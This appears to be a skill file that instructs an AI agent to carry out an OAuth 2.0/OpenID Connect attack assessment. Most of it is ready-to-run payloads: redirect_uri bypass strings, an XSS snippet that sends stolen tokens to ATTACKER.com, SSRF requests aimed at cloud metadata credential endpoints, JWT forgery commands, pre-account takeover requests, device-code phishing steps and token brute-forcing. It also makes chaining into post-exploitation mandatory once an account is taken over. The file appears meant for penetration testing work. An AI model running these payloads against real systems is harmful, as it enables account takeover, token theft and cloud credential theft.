---
name: oauth-security
description: |
  Deep OAuth 2.0 / OpenID Connect security assessment. Covers the full attack surface: redirect_uri validation bypass (path traversal, open redirect chains, subdomain confusion, URL parsing tricks, parameter pollution, response mode switching), missing/broken state parameter CSRF, PKCE downgrade and absent-challenge attacks, implicit grant token leakage (Referer, browser history, XSS fragment theft), authorization code injection, scope escalation, client confusion attacks, mutable-claims account takeover (iss+sub confusion, email-keyed identity merging), pre-account takeover via unverified registration, OpenID Connect dynamic client registration SSRF (logo_uri, jwks_uri, sector_identifier_uri, request_uri), nonce replay, ID token validation failures, Device Code phishing flow, mobile custom URI scheme hijacking, refresh token persistence, token introspection enumeration, consent screen clickjacking, host header injection, and cross-IdP mix-up attacks.

  Uses KOAuth, jwt_tool, nuclei oauth templates, and manual http(action="request", ...) payloads. Every technique includes actual request payloads and verification logic. Chains from /pentester or /api-security when OAuth endpoints are discovered. Chains into /web-exploit for open redirect, XSS, and SSRF chaining. Chains into /post-exploit when full account takeover is achieved. Chains into /credential-audit when access tokens or refresh tokens are recovered.
argument-hint: <target-url> [flow=auth-code|implicit|device-code|pkce|oidc|mobile] [depth=quick|standard|thorough]
user-invocable: true
---

# OAuth 2.0 / OpenID Connect Security Assessment

You are an expert OAuth security tester. Your goal: take a target application or authorization server and enumerate every OAuth misconfiguration, implementation flaw, and protocol abuse that can be weaponized — from token theft and account takeover to SSRF via dynamic client registration. Produce confirmed PoCs for every working exploit.

OAuth is not "just authentication." It is an authorization delegation protocol grafted onto authentication in ways the original spec never intended, by developers who often don't understand the subtle differences. The result is a rich attack surface that combines protocol abuse, web vulnerabilities, and identity logic flaws into a class of bugs that frequently yields full account takeover.

**Request:** $ARGUMENTS

---

## CHAIN COMMITMENTS — DECLARE BEFORE STARTING

Read this before executing any workflow phase. Commit to MANDATORY chains before your first tool call.

| Trigger | Chain | Mandatory? | Claude Code | opencode |
|---------|-------|-----------|-------------|---------|
| After `session(action="complete")` | `/gh-export` | OPTIONAL — user request only | `Skill(skill="gh-export")` | `cat ~/.config/opencode/commands/gh-export.md` |
| Account takeover confirmed | `/post-exploit` | **MANDATORY** | `Skill(skill="post-exploit")` | `cat ~/.config/opencode/commands/post-exploit.md` |
| Open redirect / XSS / SSRF found as chaining primitive | `/web-exploit` | **MANDATORY** | `Skill(skill="web-exploit")` | `cat ~/.config/opencode/commands/web-exploit.md` |
| Access tokens / refresh tokens / client secrets recovered | `/credential-audit` | OPTIONAL | `Skill(skill="credential-audit")` | `cat ~/.config/opencode/commands/credential-audit.md` |
| CVE-affected OAuth library confirmed | `/analyze-cve` | OPTIONAL | `Skill(skill="analyze-cve")` | `cat ~/.config/opencode/commands/analyze-cve.md` |

**If account takeover is achieved: MUST invoke `/post-exploit` — do not stop at confirming login.**

---

## Tools Available

| Tool | Use for |
|------|---------|
| `session(action="start", options={...})` | Define target, scope, depth, and hard limits — **always call this first** |
| `session(action="complete", options={...})` | Mark the scan done and write final notes |
| `kali(command=...)` | Kali tools: KOAuth, jwt_tool, nuclei, ffuf, curl, python scripts |
| `http(action="request", ...)` | Raw HTTP — manual payload crafting, redirect_uri manipulation, token exchange probes, PoC verification. Set `poc=True` for confirmed exploits |
| `http(action="save_poc", ...)` | Save a confirmed exploit as a raw `.http` file in `pocs/` |
| `scan(tool="nuclei", ...)` | OAuth/OIDC template scans, exposed discovery endpoints |
| `scan(tool="ffuf", ...)` | Enumerate OAuth endpoints, scope values, client_id fuzzing |
| `report(action="finding", data={...})` | Log a confirmed vulnerability with evidence to findings.json |
| `report(action="diagram", data={...})` | Save a Mermaid diagram (attack flow, token exfil chain) to findings.json |
| `report(action="dashboard", data={"port": 7777})` | Serve dashboard.html at localhost:7777 |
| `report(action="note", data={...})` | Write a reasoning note or decision to the session log |

**Logging:** Before invoking any skill, call `session(action="set_skill", options={"skill":"<name>","reason":"<why>","chained_from":"oauth-security"})`.

---

## Vulnerability Categories

| ID | Category | Key Techniques |
|----|----------|----------------|
| **OA01** | Redirect URI Validation Bypass | Path traversal, open redirect chains, subdomain injection, URL parsing tricks, parameter pollution, response mode switching |
| **OA02** | Missing / Broken State Parameter | CSRF account linking, login CSRF, static state replay |
| **OA03** | PKCE Downgrade / Absent | S256→plain downgrade, missing challenge, code injection on PKCE-free flows |
| **OA04** | Implicit Grant Exposure | Fragment token via Referer, browser history, XSS theft, HTML injection |
| **OA05** | Authorization Code Injection | Code replay across sessions, cross-client injection |
| **OA06** | Scope Escalation | Scope upgrade at token exchange, implicit flow scope injection |
| **OA07** | Client Confusion | Token accepted from wrong client_id, unvalidated audience |
| **OA08** | Mutable Claims / iss+sub Confusion | Email-keyed identity, cross-IdP sub collision, email_verified bypass |
| **OA09** | Pre-Account Takeover | Pre-registration with victim email, OAuth auto-merge on login |
| **OA10** | OIDC Dynamic Client Registration SSRF | logo_uri, jwks_uri, sector_identifier_uri, request_uri pointing to internal services |
| **OA11** | Nonce / ID Token Validation Failure | Nonce replay, missing iss/aud/exp/nonce validation |
| **OA12** | Device Code Phishing | SquarePhish flow, QR+device code combination, MFA bypass |
| **OA13** | Mobile Custom URI Scheme Hijacking | Android custom scheme, iOS URL scheme, missing assetlinks.json |
| **OA14** | Token Persistence Abuse | Refresh token reuse after logout, rotation grace period, introspection enumeration |
| **OA15** | Consent Screen Clickjacking | iframe embedding of `/authorize` with invisible overlay |
| **OA16** | Host Header Injection | OAuth redirect poisoning via Host header |
| **OA17** | Unverified Provider Registration | Register attacker account at OAuth provider using victim email |
| **OA18** | CORS on UserInfo Endpoint | Cross-origin token claim theft |
| **OA19** | Mix-Up Attack | Multiple IdP confusion, code from IdP-A used against IdP-B client |
| **OA20** | WebFinger User Enumeration | Confirm user existence via .well-known/webfinger |

---

## Depth Presets

| Depth | What runs |
|-------|-----------|
| `quick` | Discovery + state/redirect_uri checks + PKCE check + implicit grant detection |
| `standard` | Quick + full redirect_uri bypass matrix + scope escalation + mutable claims + pre-ATO + OIDC client registration |
| `thorough` | Standard + device code phishing assessment + mobile deep link analysis + token persistence + clickjacking + mix-up + all OIDC attacks + KOAuth automated sweep |

---

## Workflow

### Before running any tool

If the request does not specify what to test, ask the user:

> **Target:** `<extracted URL>`
> **Known OAuth endpoints?** (authorize, token, userinfo, introspect, registration)
> **Flows in use:** `auth-code`, `implicit`, `device-code`, `PKCE`, `OpenID Connect`?
> **Do you have two accounts?** (attacker-controlled + victim) — required for code injection and mutable claims tests
> **Is this a confidential or public client?** (determines PKCE expectation)
>
> Assessment depth?
> - `quick` — state + redirect_uri + PKCE basics *(5 min)*
> - `standard` — full OA01–OA12 sweep *(30–45 min)*
> - `thorough` — all categories + KOAuth automation + mobile *(unlimited)*

---

### Phase 0 — Scope & Setup

```
session(action="start", options={
  "target": "https://TARGET",
  "skill": "oauth-security",
  "depth": "standard"
})
report(action="dashboard", data={"port": 7777})
report(action="note", data={"message": "Recording target, known endpoints, auth state, test accounts"})
```

---

### Phase 1 — Discovery & Reconnaissance

**Step 1a — OAuth/OIDC endpoint discovery:**

Always probe these paths first, regardless of what documentation says:

```
http(action="request", url="https://TARGET/.well-known/openid-configuration")
http(action="request", url="https://TARGET/.well-known/oauth-authorization-server")
http(action="request", url="https://TARGET/oauth/.well-known/openid-configuration")
http(action="request", url="https://TARGET/auth/.well-known/openid-configuration")
http(action="request", url="https://TARGET/.well-known/jwks.json")
http(action="request", url="https://TARGET/.well-known/webfinger?resource=http://x/test&rel=http://openid.net/specs/connect/1.0/issuer")
```

The `openid-configuration` JSON is a gold mine — it lists every endpoint: `authorization_endpoint`, `token_endpoint`, `userinfo_endpoint`, `introspection_endpoint`, `revocation_endpoint`, `registration_endpoint`, `jwks_uri`, `end_session_endpoint`, `device_authorization_endpoint`.

**Step 1b — Scan for common OAuth paths:**

```
scan(tool="ffuf", target="https://TARGET/FUZZ", options={
  "wordlist": "/usr/share/wordlists/seclists/Discovery/Web-Content/oauth-endpoints.txt"
})
```

Fallback wordlist if not available — probe these manually:
```
/oauth/authorize    /oauth2/authorize    /auth/authorize    /connect/authorize
/oauth/token        /oauth2/token        /auth/token        /connect/token
/oauth/userinfo     /oauth2/userinfo     /userinfo          /connect/userinfo
/oauth/introspect   /oauth2/introspect   /token/introspect
/oauth/revoke       /oauth2/revoke
/oauth/register     /oauth2/register     /connect/register  /registration
/oauth/device       /oauth2/device       /connect/device
/oauth/jwks         /oauth2/jwks         /.well-known/jwks.json
```

**Step 1c — nuclei OAuth template scan:**

```
scan(tool="nuclei", target="https://TARGET", options={
  "templates": "technologies/oauth,exposures/tokens,misconfiguration/oauth"
})
```

**Step 1d — Capture a live OAuth flow:**

Proxy a legitimate login through Burp Suite. Extract:
- `client_id` — store it, you'll need it for crafting attacks
- `redirect_uri` — baseline for bypass attempts
- `scope` — baseline for escalation attempts
- `state` — check if present and how it's formatted
- `response_type` — `code` (auth-code) or `token` (implicit) or `code id_token` (hybrid)
- `code_challenge` and `code_challenge_method` — PKCE check
- Any `nonce` parameter (OIDC)

Record all findings in notes:
```
report(action="note", data={
  "message": "Baseline OAuth flow captured",
  "client_id": "...",
  "redirect_uri": "...",
  "scopes": "...",
  "has_state": true/false,
  "has_pkce": true/false,
  "response_type": "code",
  "is_oidc": true/false
})
```

---

### Phase 2 — OA02: State Parameter / CSRF

**Why it matters:** A missing or static `state` lets an attacker trick a victim into linking their account to the attacker's OAuth identity. The victim does the consent click; the attacker gets access.

**Test 2a — Is the state parameter present?**
```
http(action="request",
  url="https://TARGET/oauth/authorize?response_type=code&client_id=CLIENT_ID&redirect_uri=REDIRECT_URI&scope=openid",
  method="GET"
)
```
If the authorization server accepts the request and redirects without a `state`, mark **OA02 — State Missing**.

**Test 2b — Is the state validated server-side?**
1. Initiate a legitimate flow, capture `state=LEGIT_VALUE`
2. Make a second authorization request with `state=ATTACKER_CONTROLLED`
3. Complete the flow — does the callback accept it?
4. Replay the same `state` value in a second session — does the server reject it?

**Test 2c — Account linking CSRF (no state):**
```
# Attacker flow:
# 1. Attacker initiates OAuth flow, gets authorization URL without state
# 2. Attacker does NOT complete the flow — stops before clicking Authorize
# 3. Attacker sends the /authorize URL to victim (as a link in an email, iframe, etc.)
# 4. Victim clicks, logs in with their credentials, hits Authorize
# 5. Victim's account on the client app is now linked to Attacker's IdP identity
# PoC URL to send to victim:
https://OAUTH_PROVIDER/authorize?response_type=code&client_id=CLIENT_ID&redirect_uri=ATTACKER_CONTROLLED_REDIRECT
```

If successful — `report(action="finding")` with severity **high**, reference OA02.

---

### Phase 3 — OA01: Redirect URI Validation Bypass

**Why it matters:** If the authorization server accepts a redirect_uri it shouldn't, the authorization code (or token in implicit flow) goes to the attacker. Code → token → account. This is the most direct account takeover path.

**The bypass matrix — test ALL of these systematically:**

Set `BASELINE=https://legitimate.example.com/callback` (the registered URI).

| # | Payload | Technique |
|---|---------|-----------|
| 1 | `https://legitimate.example.com.ATTACKER.com/callback` | Subdomain suffix |
| 2 | `https://ATTACKER.com@legitimate.example.com/callback` | Userinfo injection |
| 3 | `https://legitimate.example.com#@ATTACKER.com/callback` | Fragment injection |
| 4 | `https://legitimate.example.com%23@ATTACKER.com/callback` | URL-encoded fragment |
| 5 | `https://legitimate.example.com/callback/../../../ATTACKER.com` | Path traversal |
| 6 | `https://legitimate.example.com/callback/../../evil` | Directory traversal |
| 7 | `https://legitimate.example.com/callback%2F%2E%2E%2Fevil` | URL-encoded traversal |
| 8 | `https://ATTACKER.legitimate.example.com/callback` | Subdomain prefix |
| 9 | `https://legitimate.example.com/callback?extra=param` | Query parameter append |
| 10 | `https://legitimate.example.com/callback?extra=param&redirect_uri=https://ATTACKER.com` | Parameter pollution |
| 11 | `http://legitimate.example.com/callback` | Scheme downgrade HTTP |
| 12 | `https://localhost.ATTACKER.com/callback` | Localhost bypass |
| 13 | `https://127.0.0.1/callback` | Direct IP |
| 14 | `https://legitimate.example.com:4443/callback` | Port variation |
| 15 | `https://legitimate.example.com/CALLBACK` | Case variation |
| 16 | `https://legitimate.example.com/callback%00` | Null byte suffix |
| 17 | `https://legitimate.example.com/callback%20` | Trailing space |
| 18 | `https://legitimate.example.com/callback/` | Trailing slash |
| 19 | `https://&@ATTACKER.com#@legitimate.example.com/` | Multi-parsing trick |
| 20 | `https://legitimate.example.com%2F%40ATTACKER.com/callback` | Double-encoding |

For each bypass test:
```
http(action="request",
  url="https://OAUTH_PROVIDER/authorize?response_type=code&client_id=CLIENT_ID&redirect_uri=<PAYLOAD>&scope=openid",
  method="GET",
  follow_redirects=False
)
```
If the server returns a 302 to the manipulated URI (even to an intermediate page) — that means the redirect_uri was accepted. Log it.

**Test 3b — Response mode switching:**

Try changing `response_mode` to alter how the code is delivered:
```
# Standard: code in query string
?response_type=code&response_mode=query

# Try fragment — may bypass some validations
?response_type=code&response_mode=fragment

# web_message — may allow broader origin matching
?response_type=code&response_mode=web_message&redirect_uri=https://ATTACKER.com

# form_post — POSTs code to redirect_uri; different parser path
?response_type=code&response_mode=form_post
```

**Test 3c — Open redirect chain:**

If you find an open redirect on any page of the whitelisted domain (e.g., `/logout?next=`, `/redirect?to=`, `/go?url=`), chain it:
```
redirect_uri=https://legitimate.example.com/logout?next=https://ATTACKER.com
```
The code lands on `/logout`, then gets forwarded in the Referer or Location header to `ATTACKER.com`.

For each confirmed bypass, craft the full PoC — attacker sends victim the malicious authorization URL:
```
https://OAUTH_PROVIDER/authorize?
  response_type=code
  &client_id=CLIENT_ID
  &redirect_uri=<BYPASS_PAYLOAD>
  &scope=openid%20email%20profile
  &state=arbitrary
```
Victim clicks → auth code sent to attacker → attacker exchanges for token at token endpoint.

```
http(action="request",
  url="https://OAUTH_PROVIDER/token",
  method="POST",
  body="grant_type=authorization_code&code=STOLEN_CODE&redirect_uri=<BYPASS_PAYLOAD>&client_id=CLIENT_ID",
  poc=True
)
```

If successful: `report(action="finding")` with severity **critical**, reference OA01.

---

### Phase 4 — OA03: PKCE Downgrade / Absent

**Why it matters:** PKCE prevents authorization code injection. Without it, any stolen code can be exchanged. Even with PKCE, implementation bugs allow downgrade from S256 to plain.

**Test 4a — Is PKCE used at all?**
If the baseline flow from Phase 1 has no `code_challenge` parameter → **OA03-A: PKCE not implemented**.

**Test 4b — Can you omit `code_verifier` at the token exchange?**
```
# Legitimate flow sends:
POST /token
code=AUTH_CODE&grant_type=authorization_code&code_verifier=RANDOM_STRING&client_id=...

# Try omitting code_verifier:
POST /token
code=AUTH_CODE&grant_type=authorization_code&client_id=...

# Or send an empty verifier:
POST /token
code=AUTH_CODE&grant_type=authorization_code&code_verifier=&client_id=...
```
If the server returns a token — **OA03-B: PKCE code_verifier not validated**.

**Test 4c — S256 → plain downgrade:**
```
# Initiate authorization with S256:
GET /authorize?code_challenge=BASE64URL(SHA256(verifier))&code_challenge_method=S256&...

# But exchange the code using "plain" (verifier = challenge):
POST /token
code=AUTH_CODE&grant_type=authorization_code&code_verifier=<the_challenge_value_itself>&client_id=...
```
If the server accepts this — **OA03-C: S256→plain downgrade possible**.

**Test 4d — Initiate without challenge; accept at token endpoint:**
```
GET /authorize?response_type=code&client_id=CLIENT_ID&redirect_uri=REDIRECT&scope=openid
# No code_challenge, no code_challenge_method
```
If this request is accepted (returns a code) → PKCE not enforced on initiation. Then test whether the code can be exchanged without any verifier.

For any PKCE bypass, demonstrate authorization code injection:
```
# 1. Victim initiates their own auth flow, gets an auth code
# 2. Attacker intercepts the code (via redirect_uri bypass or MITM)
# 3. Attacker injects the code into their own session at the token endpoint:
POST /token
code=VICTIM_CODE&grant_type=authorization_code&redirect_uri=ATTACKER_REDIRECT&client_id=CLIENT_ID
```

---

### Phase 5 — OA04: Implicit Grant Token Exposure

**Why it matters:** Implicit grant puts the access token in the URL fragment. This leaks through Referer headers, browser history, server logs, and XSS.

**Test 5a — Detect implicit grant:**
```
http(action="request",
  url="https://OAUTH_PROVIDER/authorize?response_type=token&client_id=CLIENT_ID&redirect_uri=REDIRECT&scope=openid",
  method="GET"
)
```
If the server accepts `response_type=token` → implicit grant is live.

**Test 5b — Fragment token leakage via Referer:**
1. Complete an implicit flow — capture the callback URL: `https://app.com/callback#access_token=TOKEN&...`
2. Inspect the callback page for third-party resources (analytics, fonts, images, CDN scripts)
3. If any third-party request includes `Referer: https://app.com/callback#access_token=TOKEN` → **OA04-A: Token leaks via Referer**.

Check using DevTools → Network → filter by third-party domains, inspect Referer headers.

**Test 5c — XSS to steal fragment token:**
If an XSS exists anywhere on the domain receiving the fragment:
```javascript
// Payload injected on callback page — steal fragment token via postMessage or image request
<script>
window.location = 'https://ATTACKER.com/steal?t=' + encodeURIComponent(window.location.hash);
</script>
```

**Test 5d — HTML injection to leak via Referer (CSP bypass):**
If JS injection is blocked but HTML injection works, inject:
```html
<img src="https://ATTACKER.com/leak">
```
The Referer header on the img request will contain the full URL including fragment (in browsers where fragment is in Referer).

**Test 5e — Force implicit flow on auth-code clients:**
```
# Try switching from code to token to see if server enforces response_type:
Original:  ?response_type=code&...
Attack:    ?response_type=token&...
```
If accepted — the server doesn't restrict implicit grant to specific clients.

---

### Phase 6 — OA06: Scope Escalation

**Why it matters:** If the authorization server doesn't lock the scope to what was originally approved, an attacker can upgrade their token permissions at exchange time.

**Test 6a — Scope upgrade at token exchange:**
```
# Original authorization: scope=openid email
# Inject additional scopes during token exchange:
POST /token
grant_type=authorization_code
&code=AUTH_CODE
&client_id=CLIENT_ID
&redirect_uri=REDIRECT
&scope=openid email profile address phone admin offline_access
```
Compare the `scope` claim in the returned access token against the originally requested scope. If the token contains more than `openid email` → **OA06-A: Scope upgrade at token exchange**.

**Test 6b — Scope injection at authorization endpoint:**
```
GET /authorize?scope=openid+email+profile+admin&response_type=code&client_id=CLIENT_ID&...
```
If the authorization server shows more permissions in the consent screen than the application normally requests, check if the token carries those expanded scopes.

**Test 6c — Undocumented scope enumeration:**
```
scan(tool="ffuf", target="https://OAUTH_PROVIDER/authorize?scope=FUZZ&response_type=code&client_id=CLIENT_ID&redirect_uri=REDIRECT", options={
  "wordlist": "/usr/share/wordlists/seclists/Discovery/OAuth/scopes.txt",
  "filter_code": "400,invalid_scope"
})
```
Common high-value scopes to test: `admin`, `offline_access`, `email`, `profile`, `openid`, `read:all`, `write:all`, `superuser`, `internal`, `manage`, `delete`, `sudo`.

**Test 6d — Resource server scope validation:**
Once you have a limited-scope token, attempt to call API endpoints that require higher scopes:
```
http(action="request",
  url="https://TARGET/api/admin/users",
  headers={"Authorization": "Bearer LOW_SCOPE_TOKEN"}
)
```
If the resource server doesn't validate scope claims → **OA06-D: Resource server accepts underprivileged tokens**.

---

### Phase 7 — OA07: Client Confusion

**Why it matters:** An application that accepts access tokens without verifying the `aud` (audience) claim or `client_id` binding will accept tokens issued to entirely different client applications — including attacker-registered ones.

**Test 7a — Register a public client (if registration endpoint exists):**
```
http(action="request",
  url="https://OAUTH_PROVIDER/oauth/register",
  method="POST",
  headers={"Content-Type": "application/json"},
  body='{
    "client_name": "TestApp",
    "redirect_uris": ["https://ATTACKER.com/callback"],
    "grant_types": ["authorization_code"],
    "response_types": ["code"],
    "scope": "openid email profile"
  }'
)
```
If successful — note the `client_id` and `client_secret` returned.

**Test 7b — Obtain token for attacker's client, use against target app:**
1. Get a victim user to authorize against attacker's client
2. Exchange the code for an access token (issued to `client_id=ATTACKER_CLIENT`)
3. Present this token to the target application's resource endpoints:
```
http(action="request",
  url="https://TARGET/api/user/profile",
  headers={"Authorization": "Bearer ATTACKER_CLIENT_TOKEN"}
)
```
If the server accepts and returns the victim's data → **OA07: Client confusion confirmed**.

**Test 7c — Token from legitimate client accepted by another app:**
If the OAuth provider serves multiple client applications on the same tenant, test whether a token obtained for App-A can be used against App-B's resource endpoints.

---

### Phase 8 — OA08: Mutable Claims / iss+sub Confusion

**Why it matters:** Two different IdPs can issue the same `sub` value for two different users. If an application keys identity on `sub` alone (not on `(iss, sub)` tuple), an attacker with a controlled IdP account bearing the same `sub` can impersonate any user. Even more common: apps key identity on `email`, which is mutable and controllable by the attacker within most IdPs.

**Test 8a — Email-keyed identity attack:**
1. Find an application that supports "Login with Google" (or similar)
2. Check whether it uses `email` from the ID token as the identity key
3. Create a Google Workspace (or other IdP) account where you can set the primary email to the victim's address
4. Log in via OAuth → if the app merges accounts based on email → **OA08-A: Mutable email claim used as identity**.

Decode the ID token JWT to inspect claims:
```
kali(command="jwt_tool <ID_TOKEN> --decode")
```
Look for `email`, `sub`, `iss`, `email_verified`.

**Test 8b — email_verified bypass:**
Some apps only require `email_verified: true` but don't check which IdP issued it. Create an account at any IdP that grants you `email_verified: true` on an arbitrary email address.

**Test 8c — Cross-IdP sub collision:**
If an app supports multiple IdPs (Google + GitHub + Microsoft):
1. Check if they store only `sub` without `iss`
2. Create accounts at two IdPs where you can control the `sub` value (or find a collision)
3. Attempt cross-IdP login

**Test 8d — Inspect ID token for iss+sub handling:**
```
# Decode the id_token returned during login
kali(command="jwt_tool <ID_TOKEN> --decode")

# Check: does the app store and compare (iss, sub) together?
# Test: create a second account at a different IdP with matching sub value
```

---

### Phase 9 — OA09: Pre-Account Takeover

**Why it matters:** If an application allows registration without email verification AND also supports OAuth social login that auto-merges on email match — an attacker can register before the victim and "own" their account the moment the victim first logs in.

**Attack flow:**
1. Identify victim's email (e.g., from OSINT, exposed registration form)
2. Register a normal (password-based) account using the victim's email — app does not verify email
3. Wait for victim to sign up via Google OAuth (or similar) using the same email
4. App sees email matches → merges OAuth identity onto the attacker's existing account
5. Attacker can now log in with their own password and has the victim's Google OAuth linked

**Test 9a:**
```
# Step 1: Register attacker account with victim email (no verification required)
http(action="request",
  url="https://TARGET/register",
  method="POST",
  body='{"email":"victim@example.com","password":"Attacker1234!"}'
)

# Step 2: Verify the account appears in the app (even unverified)
http(action="request",
  url="https://TARGET/api/user/me",
  headers={"Authorization": "Bearer ATTACKER_TOKEN"}
)
```

**Test 9b — Account squatting via OAuth with unverified provider:**
If the OAuth provider allows registering with any email (without verification), create an attacker OAuth account at the provider with the victim's email, then attempt login at the target.

**Test 9c — Email mutation variants:**
Many apps normalize emails before lookup. Test these variants of `victim@example.com`:
- `victim+tag@example.com`
- `VICTIM@example.com`
- `v.i.c.t.i.m@example.com` (Gmail ignores dots)
- `victim@EXAMPLE.COM`

If any variant merges with the victim's canonical account → **OA09: Pre-account takeover via email normalization bypass**.

---

### Phase 10 — OA10/OA11: OpenID Connect Attacks

#### 10a — Dynamic Client Registration SSRF

If `/registration` or `/oauth/register` exists and accepts unauthenticated registration:

```
http(action="request",
  url="https://OAUTH_PROVIDER/oauth/register",
  method="POST",
  headers={"Content-Type": "application/json"},
  body='{
    "client_name": "SSRFTest",
    "redirect_uris": ["https://ATTACKER.com/callback"],
    "logo_uri": "http://169.254.169.254/latest/meta-data/",
    "jwks_uri": "http://ATTACKER.com/jwks.json",
    "sector_identifier_uri": "http://ATTACKER.com/sector.json",
    "request_uris": ["http://ATTACKER.com/request.jwt"]
  }'
)
```

- `logo_uri` → triggered when server displays client logo during consent (check SSRF listener)
- `jwks_uri` → triggered when server validates a JWT assertion at token endpoint
- `sector_identifier_uri` → triggered during registration validation
- `request_uris` → triggered when client uses `request_uri` parameter

Use a Burp Collaborator or interactsh listener to confirm callbacks:
```
kali(command="interactsh-client -n 1")
```

For each callback received — pivot to cloud metadata:
```
body='{...,"logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'
body='{...,"logo_uri": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"}'
body='{...,"logo_uri": "http://169.254.169.254/metadata/instance?api-version=2021-02-01"}'
```

#### 10b — request_uri SSRF (without dynamic registration)

If the authorization endpoint accepts a `request_uri` parameter:
```
GET /authorize?
  response_type=code
  &client_id=CLIENT_ID
  &request_uri=http://ATTACKER.com/evil.jwt

# JWT at evil.com can contain manipulated redirect_uri, scope, etc.
# AND triggers SSRF when server fetches it
```

The server fetches the JWT from `request_uri` — point it at internal services. Also: the JWT inside `request_uri` may bypass redirect_uri validation that the query string applies.

#### 10c — Nonce Replay

If the OIDC flow uses `nonce` but doesn't validate it server-side:
```
# Step 1: Complete a legitimate OIDC flow — capture the id_token
# Step 2: Extract the nonce from the id_token JWT payload
kali(command="jwt_tool <ID_TOKEN> --decode")

# Step 3: Replay the id_token at the application's authentication endpoint
# (works if application doesn't track which nonces were issued and redeemed)
http(action="request",
  url="https://TARGET/auth/callback",
  method="POST",
  body="id_token=<REPLAYED_TOKEN>&state=..."
)
```

#### 10d — ID Token Validation Failures

Test whether the application validates each claim:
```python
# Generate a forged id_token (requires either: server's private key, or RS256→HS256 confusion with public key)
kali(command="jwt_tool <LEGIT_ID_TOKEN> -I -pc sub -pv victim@example.com -S hs256 -k public.pem")
```

Claims to test modifying:
- `sub` → change to victim's subject identifier
- `email` → change to victim's email
- `aud` → change to a different client_id
- `iss` → change to a different issuer (check if app validates)
- `exp` → set to a future/past timestamp
- `nonce` → modify to a known value

#### 10e — WebFinger User Enumeration

```
# Test if accounts exist by probing WebFinger:
http(action="request",
  url="https://TARGET/.well-known/webfinger?resource=acct:admin@TARGET&rel=http://openid.net/specs/connect/1.0/issuer"
)
http(action="request",
  url="https://TARGET/.well-known/webfinger?resource=acct:victim@TARGET&rel=http://openid.net/specs/connect/1.0/issuer"
)
# 200 = user exists; 404 = user does not exist
```

---

### Phase 11 — OA12: Device Code Phishing Assessment

**Why it matters:** The device authorization flow (`/oauth/device/code`) was designed for input-constrained devices. Attackers abuse it because: the victim enters a code at a legitimate provider URL (bypassing phishing detection), MFA is completed by the victim on the attacker's behalf, and the resulting refresh token persists indefinitely.

**Test 11a — Check if device flow is enabled:**
```
http(action="request",
  url="https://OAUTH_PROVIDER/oauth/device/code",
  method="POST",
  body="client_id=CLIENT_ID&scope=openid email profile"
)
```
If a `device_code`, `user_code`, and `verification_uri` are returned → device flow is live.

**Test 11b — Assess the flow for phishing surface:**
Check:
- Is the `verification_uri` a well-known, trusted domain? (microsoft.com/devicelogin, google.com/device) → higher phishing success rate
- What is the `expires_in` for the device code? Longer window → more time for social engineering
- Is there a rate limit on polling `/token`? If not → can poll aggressively

**Test 11c — Simulate the attack (with authorization):**
```
# 1. Attacker obtains device_code and user_code
http(action="request", url="https://OAUTH_PROVIDER/oauth/device/code",
  method="POST", body="client_id=CLIENT_ID&scope=openid email profile offline_access")

# 2. Attacker sends victim to verification_uri with the user_code (via phishing email/QR)
# verification_uri_complete = https://provider.com/device?user_code=XXXX-XXXX

# 3. Attacker polls for completion:
http(action="request", url="https://OAUTH_PROVIDER/oauth/token",
  method="POST",
  body="grant_type=urn:ietf:params:oauth:grant-type:device_code&device_code=DEVICE_CODE&client_id=CLIENT_ID")

# 4. Once victim enters code and approves, poll returns access_token + refresh_token
```

Report findings with:
- Is device flow exposed to the public internet?
- Is rate limiting on polling absent?
- What scopes does the device flow grant?
- How long do the tokens persist?

---

### Phase 12 — OA13: Mobile Custom URI Scheme Hijacking

**Test 12a — Identify OAuth redirect URI scheme:**
If the target has a mobile app, analyze:
- The app's registered redirect URI (look in OAuth docs, JS bundles, or intercept traffic)
- Custom URI scheme: `myapp://oauth/callback` vs Universal Link: `https://app.example.com/oauth/callback`

**Test 12b — Custom scheme interception (Android):**
```
# Check if redirect_uri uses a custom scheme:
?redirect_uri=com.example.app://oauth/callback

# Custom schemes are insecure — any app can register the same scheme
# Test: register the scheme in a test app and complete the OAuth flow on the same device
# The OS may route the callback intent to your test app, delivering the auth code

# Check assetlinks.json for proper App Link verification:
http(action="request", url="https://example.com/.well-known/assetlinks.json")
# If this file is missing or misconfigured → Android App Links not verified → custom scheme is the only option
```

**Test 12c — iOS URL scheme hijacking:**
```
# Similar issue on iOS — custom schemes can be registered by any app
# Universal Links are the secure alternative

# Test: is the Apple App Site Association file present?
http(action="request", url="https://example.com/.well-known/apple-app-site-association")
# If missing → iOS Universal Links not configured → custom scheme is the fallback
```

**Test 12d — Deep link token leakage:**
Check whether the OAuth code or token appears in:
- Server access logs (from a referrer or direct request)
- Analytics dashboards embedded in the app
- WebView Referer headers on the landing page

---

### Phase 13 — OA14: Token Persistence Abuse

**Test 13a — Refresh token reuse after logout:**
```
# Step 1: Log in, capture refresh_token
http(action="request", url="https://OAUTH_PROVIDER/oauth/token",
  method="POST", body="grant_type=password&username=USER&password=PASS&client_id=CLIENT_ID")
# → save refresh_token

# Step 2: Log out
http(action="request", url="https://TARGET/logout", headers={"Cookie": "session=..."})

# Step 3: Try to use the refresh_token to get a new access_token
http(action="request", url="https://OAUTH_PROVIDER/oauth/token",
  method="POST", body="grant_type=refresh_token&refresh_token=SAVED_REFRESH_TOKEN&client_id=CLIENT_ID")
# If this succeeds → OA14-A: Refresh token not revoked on logout
```

**Test 13b — Introspection endpoint enumeration:**
```
# If token introspection is exposed and unauthenticated:
http(action="request", url="https://OAUTH_PROVIDER/oauth/introspect",
  method="POST", body="token=GUESSED_TOKEN&token_type_hint=access_token")

# If no authentication is required on the introspect endpoint → enumerate tokens by brute force
kali(command="ffuf -u https://OAUTH_PROVIDER/oauth/introspect -X POST -d 'token=FUZZ' -w /usr/share/wordlists/tokens.txt -mr 'active.*true'")
```

**Test 13c — Refresh token rotation grace period abuse:**
```
# Step 1: Get a refresh_token
# Step 2: Use it (get new access_token + new refresh_token)
# Step 3: Immediately try to use the OLD refresh_token again
# If the server accepts both within a grace period → token rotation bypass
http(action="request", url="https://OAUTH_PROVIDER/oauth/token",
  method="POST", body="grant_type=refresh_token&refresh_token=OLD_REFRESH_TOKEN&client_id=CLIENT_ID")
```

**Test 13d — Access token reuse after expiry:**
```
# Capture access_token, wait for exp to pass, then use it:
http(action="request", url="https://TARGET/api/user/profile",
  headers={"Authorization": "Bearer EXPIRED_ACCESS_TOKEN"})
